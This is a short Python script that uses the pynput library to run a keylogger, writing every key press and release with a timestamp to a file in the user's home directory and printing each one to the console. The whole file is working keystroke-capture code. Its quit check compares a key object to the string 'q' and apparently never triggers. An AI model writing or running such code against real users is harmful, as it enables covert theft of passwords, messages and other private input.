from pynput import keyboard
from datetime import datetime
from pathlib import Path

log_file = "recording.txt"

def log_it(log_entry):
    file_path = Path.home() / log_file

    file_path.parent.mkdir(parents=True, exist_ok=True)

    if not file_path.exists():
        file_path.write_text(log_entry)
    else:
        with file_path.open('a') as file:
            file.write(log_entry)

    print(log_entry)

def on_press_function(key_pressed):
    # A key is pressed
    key = str(key_pressed)
    log_entry = f"Key pressed: {key} at {datetime.now()}\n"
    log_it(log_entry)
    if key_pressed == 'q':
        exit(0)

def on_release_function(key_released):
    # A key is pressed
    log_entry = f"Key released: {str(key_released)} at {datetime.now()}\n"
    log_it(log_entry)

def start_keylogger():
    # Create object for keyboard listener and start listening
    keyboard_listener = keyboard.Listener(on_press = on_press_function, on_release = on_release_function)
    keyboard_listener.start()
    keyboard_listener.join()

start_keylogger()